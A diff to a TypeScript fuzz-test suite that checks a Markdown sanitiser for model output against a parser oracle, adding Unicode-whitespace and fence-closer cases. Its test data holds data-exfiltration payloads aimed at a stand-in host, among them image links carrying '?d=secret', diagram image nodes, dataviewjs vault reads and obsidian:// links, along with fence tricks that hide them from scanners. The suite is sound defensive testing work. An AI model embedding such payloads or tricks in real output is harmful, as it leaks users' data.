@@ -15,7 +15,13 @@ import { prepareModelOutputForWrite } from "../src/safety/writePath";
  *
  * marked is not CommonMark to the letter, and neither is Obsidian's parser, so a document where the two disagree is a
  * reason to fail closed rather than a false alarm: the sanitiser leaves a fence unprotected whenever the structure
- * before it could be read two ways.
+ * before it could be read two ways, and whenever a line inside it, or its own closing line, is a closer for one parser
+ * and not for the other (marked takes "```~" and does not take a tab after the run, CommonMark the reverse). The
+ * generators therefore also emit closers with fence characters and tabs after the run, and task list prefixes, which
+ * marked reads as the start of the item's own content. A second pair of generators adds the white space that
+ * JavaScript calls white space and the parsers do not (no-break and ideographic spaces, form feeds, byte order marks)
+ * before fences, behind list and quote markers and on lines of their own, and the line and paragraph separators in
+ * and after the info string.
  *
  * ASKMATE_FUZZ_DOCUMENTS sets how many generated documents each property checks (4,000 by default; a million takes
  * about a minute and is worth running after changing the scanners).
@@ -115,9 +121,68 @@ function mulberry32(seed: number): () => number {
 	};
 }
 
+/**
+ * White space that JavaScript trims and matches with \s but that CommonMark and marked do not count as indentation or as a
+ * blank line: only the space and the tab are. A scanner that trims with JavaScript's idea of white space reads a line led
+ * by one of these as a fence line, which the parsers read as text.
+ */
+const UNICODE_WHITESPACE: ReadonlyArray<readonly [string, string]> = [
+	["a no-break space", "\u00a0"],
+	["an ideographic space", "\u3000"],
+	["an em space", "\u2003"],
+	["a narrow no-break space", "\u202f"],
+	["an Ogham space mark", "\u1680"],
+	["a vertical tab", "\u000b"],
+	["a form feed", "\u000c"],
+	["a byte order mark", "\ufeff"]
+];
+
 const HOST = "https://evil.test";
 const OPENER_INFOS = ["", "js", "text", "dataviewjs", "mermaid", "math", "dataview", "tasks", "python", "meta-bind-js-view"];
-const CONTAINER_PREFIXES = ["", "", "", "", " ", "  ", "   ", "    ", "\t", "> ", "- ", "* ", "1. ", "10) ", "  - ", "   - ", "    - ", ">> ", "> - ", "- > "];
+const CONTAINER_PREFIXES = ["", "", "", "", " ", "  ", "   ", "    ", "\t", "> ", "- ", "* ", "1. ", "10) ", "  - ", "   - ", "    - ", ">> ", "> - ", "- > ", "- [ ] ", "- [x] ", "1. [ ] ", "> - [ ] ", "  - [ ] "];
+/**
+ * What may follow a closing run. Mostly nothing or spaces, but also other fence characters, which marked takes as part of
+ * a closer and CommonMark does not, and tabs, which CommonMark takes and marked does not.
+ */
+const CLOSER_SUFFIXES = ["", "", "", "", "", "", " ", "~", "`", "~`", "``", "\t", " \t"];
+
+/** The pieces a generated document is built from, so one generator can be run with and without the Unicode ones. */
+interface Vocabulary {
+	openerInfos: readonly string[];
+	containerPrefixes: readonly string[];
+	closerSuffixes: readonly string[];
+	/** Lines of their own, which the parsers read as text although a JavaScript `trim` calls them empty. */
+	blankLines: readonly string[];
+	/** White space that leads a fence line (opener or closer) in some documents. Consuming none keeps a seed's document the same. */
+	leads: readonly string[];
+}
+
+const ASCII_VOCABULARY: Vocabulary = {
+	openerInfos: OPENER_INFOS,
+	containerPrefixes: CONTAINER_PREFIXES,
+	closerSuffixes: CLOSER_SUFFIXES,
+	blankLines: [],
+	leads: []
+};
+
+const UNICODE_LEADS = UNICODE_WHITESPACE.map(([, char]) => char);
+/**
+ * The same pieces plus white space that is not CommonMark white space: before a fence, behind a list or quote marker, and
+ * on lines of its own; U+2028 and U+2029 in and after the info string (they are not line endings to the parsers, and a
+ * regular expression `.` does not match them); and after a closing run, where they make the line a body line.
+ */
+const UNICODE_VOCABULARY: Vocabulary = {
+	openerInfos: [...OPENER_INFOS, "js\u2028x", "mermaid\u2029x", "\u2028js", "dataviewjs\u2029", "text\u00a0x"],
+	containerPrefixes: [
+		...CONTAINER_PREFIXES,
+		...UNICODE_LEADS,
+		...UNICODE_LEADS.flatMap((lead) => [`  ${lead}`, `- ${lead}`, `> ${lead}`, `${lead} `, `- [ ] ${lead}`])
+	],
+	closerSuffixes: [...CLOSER_SUFFIXES, "\u2028", "\u2029", "\u00a0", "\u2028~", " \u00a0"],
+	blankLines: UNICODE_LEADS,
+	leads: UNICODE_LEADS
+};
+
 const PAYLOADS = [
 	`![x](${HOST}/a.png?d=secret)`,
 	`![x][r]`,
@@ -168,27 +233,29 @@ function pick<T>(items: readonly T[], next: () => number): T {
 	return items[Math.floor(next() * items.length)];
 }
 
-function fenceLine(next: () => number): string {
-	const prefix = pick(CONTAINER_PREFIXES, next);
+function fenceLine(next: () => number, vocabulary: Vocabulary): string {
+	const prefix = pick(vocabulary.containerPrefixes, next);
 	const marker = next() < 0.65 ? "`" : "~";
 	const length = 3 + Math.floor(next() * 2);
-	const info = pick(OPENER_INFOS, next);
+	const info = pick(vocabulary.openerInfos, next);
 	if (next() < 0.45) {
-		// A line that could close a fence: maybe longer than the opener, maybe followed by a space.
-		return `${prefix}${marker.repeat(length + Math.floor(next() * 2))}${next() < 0.2 ? " " : ""}`;
+		// A line that could close a fence: maybe longer than the opener, maybe followed by white space or fence characters.
+		return `${prefix}${marker.repeat(length + Math.floor(next() * 2))}${pick(vocabulary.closerSuffixes, next)}`;
 	}
 	return `${prefix}${marker.repeat(length)}${info ? `${next() < 0.8 ? "" : " "}${info}` : ""}`;
 }
 
-function generateDocument(seed: number): string {
+function generateDocument(seed: number, vocabulary: Vocabulary = ASCII_VOCABULARY): string {
 	const next = mulberry32(seed);
 	const count = 3 + Math.floor(next() * 7);
 	const lines: string[] = [];
 	for (let index = 0; index < count; index += 1) {
 		if (next() < 0.42) {
-			lines.push(fenceLine(next));
+			lines.push(fenceLine(next, vocabulary));
+		} else if (vocabulary.blankLines.length > 0 && next() < 0.1) {
+			lines.push(pick(vocabulary.blankLines, next));
 		} else {
-			const prefix = next() < 0.2 ? pick(CONTAINER_PREFIXES, next) : "";
+			const prefix = next() < 0.2 ? pick(vocabulary.containerPrefixes, next) : "";
 			lines.push(`${prefix}${pick(PAYLOADS, next)}`);
 		}
 	}
@@ -200,16 +267,19 @@ function generateDocument(seed: number): string {
  * lines or not. They reach structures that random lines rarely form: a fence inside the second level of a list, a
  * quote around a list, a comment that spans a blank line.
  */
-function generateBlockDocument(seed: number): string {
+function generateBlockDocument(seed: number, vocabulary: Vocabulary = ASCII_VOCABULARY): string {
 	const next = mulberry32(seed);
 	const body = (): string => pick(PAYLOADS, next);
+	// Draws nothing when the vocabulary has no leads, so the ASCII documents of a seed do not change.
+	const lead = (): string => (vocabulary.leads.length > 0 && next() < 0.2 ? pick(vocabulary.leads, next) : "");
 	const fence = (indent: string): string[] => {
 		const marker = next() < 0.7 ? "`" : "~";
 		const length = 3 + Math.floor(next() * 2);
-		const info = pick(OPENER_INFOS, next);
+		const info = pick(vocabulary.openerInfos, next);
+		const opening = `${indent}${lead()}${marker.repeat(length)}${info}`;
 		const inner = Array.from({ length: Math.floor(next() * 4) }, () => `${indent}${body()}`);
-		const closer = next() < 0.7 ? [`${indent.slice(0, Math.floor(next() * (indent.length + 1)))}${marker.repeat(length + (next() < 0.2 ? 1 : 0))}`] : [];
-		return [`${indent}${marker.repeat(length)}${info}`, ...inner, ...closer];
+		const closer = next() < 0.7 ? [`${indent.slice(0, Math.floor(next() * (indent.length + 1)))}${lead()}${marker.repeat(length + (next() < 0.2 ? 1 : 0))}${pick(vocabulary.closerSuffixes, next)}`] : [];
+		return [opening, ...inner, ...closer];
 	};
 	const list = (depth: number, indent: string): string[] => {
 		const rows: string[] = [];
@@ -252,7 +322,7 @@ function generateBlockDocument(seed: number): string {
 		out.push(...block());
 		const gap = next();
 		if (gap < 0.6) {
-			out.push("");
+			out.push(vocabulary.blankLines.length > 0 && next() < 0.25 ? pick(vocabulary.blankLines, next) : "");
 		} else if (gap < 0.65) {
 			out.push("", "");
 		}
@@ -291,7 +361,31 @@ describe("sanitiser against a Markdown oracle: known repros", () => {
 		{ name: "a comment that runs past a blank line inside an HTML block", markdown: ">> <b>x</b>\n<!--\n   \n~~~~ \n> - `````\n-->\n<style>", live: true },
 		{ name: "a style block whose end line comes after a comment", markdown: "<style>\n<!--\n</style>\n````mermaid\nA --> B\n<style>\n[r]: https://evil.test/r.png\n flowchart TD\n   <img src=\"https://evil.test/i.png\">", live: true },
 		{ name: "a list marker inside a diagram is content, not a marker", markdown: "<b>x</b>\n    ```\n-->\n- ````mermaid\n    - flowchart TD\n%%\n# Heading", live: true },
-		{ name: "a diagram whose fence the scanner does not see is judged as written", markdown: "   <b>x</b>\n- ````dataview\n<span>\n```dataviewjs\n   - ````\n<a href=\"obsidian://open?vault=v\">x</a>\n\n~~~~mermaid\n- > flowchart TD", live: true }
+		{ name: "a diagram whose fence the scanner does not see is judged as written", markdown: "   <b>x</b>\n- ````dataview\n<span>\n```dataviewjs\n   - ````\n<a href=\"obsidian://open?vault=v\">x</a>\n\n~~~~mermaid\n- > flowchart TD", live: true },
+		{ name: "D: a closer followed by a mixed fence character ends the fence for marked only", markdown: "```js\ncode\n```~\n\n![x](https://evil.test/a.png?d=secret)\n", live: true },
+		{ name: "D: the same hides a dataviewjs fence", markdown: "```js\ncode\n```~\n\n```dataviewjs\ndv.paragraph(app.vault.getName())\n```\n", live: true },
+		{ name: "D: a tilde fence closed by a tilde run and a backtick hides an obsidian link", markdown: "~~~js\ncode\n~~~`\n\n[x](obsidian://new?vault=v&name=n&content=c)\n", live: true },
+		{ name: "D: a longer closer with both characters after the run", markdown: "````js\ncode\n````~`\n\n![x](https://evil.test/a.png?d=secret)\n", live: true },
+		{ name: "E: a closer followed by a tab closes the fence for CommonMark only", markdown: "```js\ncode\n```\t\n```\n![x](https://evil.test/a.png?d=secret)", live: true },
+		{ name: "E: a diagram closed by a tab line carries on for marked", markdown: "```mermaid\nflowchart TD\n  A-->B\n```\t\nA@{ img: \"https://evil.test/x.png\" }\n```", live: true },
+		{ name: "F: a task list item whose text is a fence opener", markdown: "- [ ] ```dataviewjs\n  dv.paragraph(app.vault.getName())\n  ```\n", live: true },
+		{ name: "F: an ordered task item with a diagram that draws an image", markdown: "1. [x] ```mermaid\n   flowchart TD\n   A@{ img: \"https://evil.test/x.png\" }\n   ```\n", live: true },
+		{ name: "G: an opener indented with a no-break space is text, so the image after it is live", markdown: "\u00a0```js\n![x](https://evil.test/a.png?d=secret)\n", live: true },
+		{ name: "G: the same prefix hides a dataviewjs fence", markdown: "\u00a0```js\n```dataviewjs\ndv.paragraph(app.vault.getName())\n````\n", live: true },
+		{ name: "G: a closer indented with a no-break space is code, which flips every later fence", markdown: "```js\ncode\n\u00a0```\ntext\n```\n![x](https://evil.test/a.png?d=secret)\n", live: true },
+		{ name: "G: a line separator in the info string does not hide the opener", markdown: "```js\u2028x\ncode\n```\n![x](https://evil.test/a.png?d=secret)\n", live: true },
+		{ name: "G: a paragraph separator in the info string does not hide the opener", markdown: "~~~js\u2029x\ncode\n~~~\n![x](https://evil.test/a.png?d=secret)\n", live: true },
+		{ name: "I: a list item's fence ends with its container, and the tab-closed line after it does not close it for marked", markdown: "- \n  ````mermaid\n  flowchart TD\n ````` \t\nA@{ img: \"https://evil.test/x.png\" }\n", live: true },
+		{ name: "I: the same with a closing line that marked takes and CommonMark does not", markdown: "- \n  ````mermaid\n  flowchart TD\n ````~\nA@{ img: \"https://evil.test/x.png\" }\n", live: false },
+		{ name: "G: a separator after a mermaid label hides a diagram that draws an image", markdown: "```mermaid\u2028x\nflowchart TD\nA@{ img: \"https://evil.test/x.png\" }\n```\n", live: true },
+		...UNICODE_WHITESPACE.flatMap(([label, char]): Repro[] => [
+			{ name: `H: an opener led by ${label} is text`, markdown: `${char}\`\`\`js\n![x](https://evil.test/a.png?d=secret)\n`, live: true },
+			{ name: `H: a closer led by ${label} is code`, markdown: `\`\`\`js\ncode\n${char}\`\`\`\ntext\n\`\`\`\n![x](https://evil.test/a.png?d=secret)\n`, live: true },
+			{ name: `H: a quoted opener led by ${label}`, markdown: `> ${char}\`\`\`js\n> ![x](https://evil.test/a.png?d=secret)\n`, live: true },
+			{ name: `H: a list item whose fence opener is led by ${label}`, markdown: `- ${char}\`\`\`js\n  ![x](https://evil.test/a.png?d=secret)\n`, live: true },
+			{ name: `J: a line of ${label} is blank to marked, so the list item runs on over it`, markdown: `* a\n\n${char}\n   \`\`\`js\n> \`= this.file.name\`\n`, live: true },
+			{ name: `J: a line of ${label} inside a list item's fence does not end it for marked`, markdown: `* a\n  \`\`\`js\n  code\n${char}\n  \`\`\`\n![x](https://evil.test/a.png?d=secret)\n`, live: true }
+		])
 	];
 
 	for (const repro of repros) {
@@ -313,7 +407,12 @@ describe("sanitiser against a Markdown oracle: known repros", () => {
 });
 
 describe("sanitiser against a Markdown oracle: generated documents", () => {
-	const generators: Record<string, (seed: number) => string> = { lines: generateDocument, blocks: generateBlockDocument };
+	const generators: Record<string, (seed: number) => string> = {
+		lines: (seed) => generateDocument(seed),
+		blocks: (seed) => generateBlockDocument(seed),
+		"unicode lines": (seed) => generateDocument(seed, UNICODE_VOCABULARY),
+		"unicode blocks": (seed) => generateBlockDocument(seed, UNICODE_VOCABULARY)
+	};
 
 	function check(kind: string, label: string, multiplier: number, offset: number, run: (document: string) => string): void {
 		const generate = generators[kind];
@@ -322,7 +421,7 @@ describe("sanitiser against a Markdown oracle: generated documents", () => {
 			const document = generate(seed * multiplier + offset);
 			const leaks = findLeaks(run(document));
 			if (leaks.length > 0) {
-				failures.push({ seed, document, leaks });
+				failures.push({ seed, document: JSON.stringify(document), leaks });
 			}
 		}
 		expect({ label, failures }).toEqual({ label, failures: [] });
@@ -349,7 +448,7 @@ describe("sanitiser against a Markdown oracle: generated documents", () => {
 				const document = generators[kind](seed * 13 + 5);
 				const once = sanitizeModelMarkdown(document);
 				if (sanitizeModelMarkdown(once) !== once) {
-					failures.push({ seed, document });
+					failures.push({ seed, document: JSON.stringify(document) });
 				}
 			}
 			expect(failures).toEqual([]);
